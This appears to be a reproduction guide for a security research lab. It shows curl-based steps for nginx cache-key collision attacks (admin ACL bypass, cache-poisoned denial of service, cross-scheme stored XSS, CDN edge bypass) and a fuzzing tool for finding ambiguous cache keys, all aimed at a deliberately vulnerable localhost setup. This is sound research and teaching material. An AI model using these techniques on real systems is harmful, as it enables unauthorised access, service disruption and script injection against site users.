# Reproduction guide

This walks through all four documented primitives against the lab in
`lab/`. Run everything from inside `lab/` unless noted.

## 0. Setup

```bash
cd lab
bash scripts/start-lab.sh
```

Run setup in Bash (Git Bash on Windows). The script generates certificates
in `lab/nginx/certs`, exports the Compose build definition to a temporary
file, builds it directly with `docker buildx bake --load`, and starts the
services with `--no-build`. This avoids the Compose-to-Bake stdin pipe error
without using the deprecated `COMPOSE_BAKE=false` setting. The temporary
build definition is removed on exit, and setup stops if any step fails.

The script resolves paths from its own location. From the repository root,
use `bash lab/scripts/start-lab.sh`; from `lab/nginx/certs`, use
`bash ../../scripts/start-lab.sh`. Run the same command again after changing
a Dockerfile or application code. Docker reuses cached layers and existing
nonempty certificate files.

**`nginx.conf` specifically needs more than a rebuild to take effect.**
It's bind-mounted into the container (`lab/nginx/nginx.conf:/etc/nginx/nginx.conf:ro`
in `docker-compose.yml`), not baked into the image — editing it on disk
changes nothing about the nginx service's image or Compose-visible config,
so Compose's own change-detection won't recreate that container on its
own. `start-lab.sh` forces this with `--force-recreate`; if you're running
`docker compose` directly instead, use `docker compose up -d --build --force-recreate`
(or `docker compose restart nginx` for a config-only change) rather than
plain `up -d --build`. A stale nginx config looks exactly like the lab
itself being broken — every response 404s with Flask's generic error page,
`X-Cache` shows hits that shouldn't be possible yet — so if something that
used to work suddenly doesn't after a config edit, try this before anything
else.

Services:

| Service | Port(s) | Role |
|---|---|---|
| `backend` | internal 5000 | Flask app, source of truth responses |
| `nginx` | 8080 (HTTP), 8443 (HTTPS) | Caching reverse proxy — the vulnerable component |
| `edge-sim` | 9090 | Simplified Cloudflare-like edge cache, for Scenario 4 only |

Every response from `nginx` carries debug headers (`X-Cache`,
`X-Debug-Key`) that are **lab-only** instrumentation — never rely on a real
target exposing the literal cache key like this; see
`docs/04-testing-methodology.md` for the black-box technique that doesn't
need it.

## Scenario 1 — Cache deception without user interaction (ACL bypass)

Config: `location = /admin` has `allow 127.0.0.1; deny all;` and the
ambiguous key `"$scheme$proxy_host$uri$is_args$args$http_accept"`.

```bash
# Seed the cache as the real admin would (request made from localhost)
./scripts/seed-admin-cache.sh

# Confirm a normal attacker request is denied
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Accept: */*" http://localhost:8080/admin
# -> 403

# Exploit: split "/admin" across the URI and the Accept header
curl -s -H "Accept: min*/*" http://localhost:8080/ad -D -
```

Expected: `X-Cache: HIT` and the response body contains the admin
dashboard content, even though the URI was `/ad`, not `/admin`, and no ACL
was satisfied for this request.

Or just run: `./scripts/run-scenario.sh acl-bypass`

## Scenario 2 — CPDoS

Same key, same mechanism, different timing: the attacker poisons the key
**before** a legitimate user requests the real resource.

```bash
# Attacker pre-poisons the /home key by requesting a 404 under a colliding key
curl -s -H "Accept: ome*/*" http://localhost:8080/h -D -

# Victim requests /home normally
curl -s -H "Accept: */*" http://localhost:8080/home -D -
```

Expected: the victim's request gets `X-Cache: HIT` and a 404, not the
homepage.

Or: `./scripts/run-scenario.sh cpdos`

> Reset between runs with `docker exec ck_nginx nginx -s reload` or
> `docker compose restart nginx` if you want a clean cache.

## Scenario 3 — Cross-scheme collision → stored XSS

Config: root `location = /` uses the global default key
`"$scheme$host$request_uri"`, listens on 80 and 443 with no redirect, and
the backend reflects `Host` into a `<script src>`.

```bash
# 1. Confirm Host reflection + that port 80 and 443 serve equivalent content
curl -sk -H "Host: target.com" "http://localhost:8080/?cachebuster=t1" | grep script

# 2. Poison: shift the trailing "s" of "https" into the Host value
curl -s -H "Host: sdummywebsite.localhost" "http://localhost:8080/" -D -

# 3. A normal HTTPS request to the real host now gets the poisoned entry
curl -sk -H "Host: dummywebsite.localhost" "https://localhost:8443/" -D -
```

Expected: step 3's response reflects `sdummywebsite.localhost` in the
script src, even though the request's `Host` was `dummywebsite.localhost`
and the scheme was `https`. In a real exploit the attacker would control
`sdummywebsite.localhost` (or an equivalent prefixed domain) and serve a
malicious `main.js` from it.

Or: `./scripts/run-scenario.sh stored-xss`

## Scenario 4 — Bypassing an edge cache (Cloudflare-like) to poison an origin cache

`edge-sim` bypasses its own cache whenever a request carries
`Authorization` (mirroring Cloudflare's documented default with Origin
Cache Control), and forwards straight to the Nginx origin, where the
ambiguous key is still in play.

```bash
# 1. Attacker request through the edge, with Authorization, splitting
#    "XYZ" across the URI and Accept header
curl -s -H "Authorization: Bearer x" -H "Accept: Z" http://localhost:9090/XY -D -
# -> CF-Cache-Status: BYPASS, X-Cache: MISS (reached nginx, nginx cached it)

# 2. Confirm the origin cache now serves /XYZ from that colliding entry
curl -s -H "Authorization: Bearer x" http://localhost:9090/XYZ -D -
# -> CF-Cache-Status: BYPASS (edge still bypassed because of Authorization),
#    X-Cache: HIT (nginx served the poisoned origin entry)
```

Note the real point of this scenario: **the edge bypass is what lets you
reach the origin cache at all.** Without the `Authorization` trick (or an
equivalent edge-bypass header for your CDN), your injected request would
be absorbed by the edge cache and never reach Nginx's ambiguous key logic.

Or: `./scripts/run-scenario.sh cdn-bypass`

## Generic fuzzing target (for `tool/ckinject`, not a scenario)

Scenarios 1, 2 and 4 all collide a single *named* pair (`/admin`↔`/ad`,
`/home`↔`/h`, `/XYZ`↔`/XY`) — the Nginx locations behind them are
exact-match, built to demonstrate one specific pair from the article.
`ckinject probe`'s generic split-marker technique needs an endpoint that
accepts *arbitrary* path suffixes and reflects them back, which none of
the scenario endpoints do.

`/fuzz` is that endpoint: a prefix-matched Nginx location using the same
ambiguous key, backed by a Flask route that echoes back the full path and
every header/query param the default probe pairs test. Before boundary
testing, you can confirm which headers it actually keys on at all with
`discover`:

```bash
cd ../tool
python -m ckinject.cli discover --target http://localhost:8080 --base-path /fuzz \
  --no-default-wordlist --extra-header Accept --extra-header Accept-Language \
  --extra-header Accept-Encoding --extra-header X-Test-Header
```

Expect `Accept` reported `KEYED` and the other three `unkeyed` — matching
`/fuzz`'s actual key formula below exactly, and a nice sanity check that
`discover` and `probe` agree with each other independently. Then run the
boundary fuzzer:

```bash
python -m ckinject.cli probe --target http://localhost:8080 --base-path /fuzz
```

You should see collisions reported for `path_suffix <-> header:Accept`
and `query:ckprobe <-> header:Accept` — `/fuzz`'s key is
`$scheme$proxy_host$uri$is_args$args$http_accept`, and both the URI and
the query string sit directly adjacent to `$http_accept` with nothing
else keyed in between, so both boundaries are ambiguous. You should
**not** see collisions for `<-> header:Accept-Language`,
`<-> header:Accept-Encoding`, or `<-> header:X-Test-Header` — this key
formula only keys on `Accept`, so those headers simply aren't part of the
key at all and have nothing to collide with, regardless of boundary
position.

(An earlier version of this doc claimed `query:ckprobe <-> header:Accept`
could never collide here. That was wrong — it was a side effect of a bug
in `ckinject` itself, now fixed: the tool used to put its own
cache-buster in a query parameter, which landed physically between `$uri`
and `$http_accept` in this exact key formula and silently broke the
boundary test for *any* path-or-query-adjacent-to-header pair. The buster
now lives in a header instead, which this formula doesn't key on.)

## Fragment discovery target: headers, cookies, and query params together

`/fuzz` only keys on one thing (`Accept`), which doesn't really exercise
`ckinject discover` — a tool meant to classify headers, cookies, *and*
query params needs a target where more than one category is actually
keyed. `/discoverlab`'s key is
`$scheme$proxy_host$uri$http_accept$cookie_session$arg_lang`: one
fragment from each category, concatenated exactly as unsafely as
`/fuzz`'s `$uri$http_accept` was.

Run discovery against it:

```bash
cd tool
python -m ckinject.cli discover --target http://localhost:8080 --base-path /discoverlab \
  --no-default-wordlist \
  --extra-header Accept --extra-header Accept-Language \
  --extra-cookie session --extra-cookie theme \
  --extra-param lang --extra-param utm_source
```

Expect `header:Accept`, `cookie:session`, and `query:lang` reported
`KEYED`; `header:Accept-Language`, `cookie:theme`, and
`query:utm_source` reported `unkeyed` — those three are deliberately left
out of the key formula so this target has genuine negatives, not just
positives.

**Bonus**: because all three keyed fragments are concatenated with
nothing between them, this target also demonstrates a boundary collision
`/fuzz` can't — between a *header and a cookie*, not just a path and a
header:

```bash
python -m ckinject.cli probe --target http://localhost:8080 --base-path /discoverlab \
  --pair "header:Accept,cookie:session"
```

## Cleanup

```bash
docker compose down -v
```

Next: `docs/03-research-roadmap.md` for where to take this.
